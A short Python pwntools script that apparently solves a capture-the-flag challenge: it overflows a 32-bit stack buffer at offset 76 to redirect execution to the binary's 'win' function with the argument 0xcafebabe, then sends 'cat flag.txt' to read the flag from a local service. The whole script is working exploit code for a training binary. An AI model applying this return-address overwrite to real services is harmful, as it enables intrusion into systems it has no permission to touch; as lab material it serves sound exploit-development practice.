#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 5001)

    return r


def main():
    r = conn()

    OFFSET = 76 # Offset to eip
    PADDING = b"AAAA" # Padding to over write parameter

    payload = flat({
        76: [
            p32(exe.sym.win),
            PADDING,
            p32(0xcafebabe)
        ]

    }, filler=b"A")

    r.sendlineafter(b"Whats the winners key to success: ", payload)

    pause()

    r.sendline(b"cat flag.txt")    
    r.recvuntil(b"ghctf")
    flag = r.clean().decode()

    log.success(f"Flag : {"ghctf" + flag}")

    r.close()


if __name__ == "__main__":
    main()
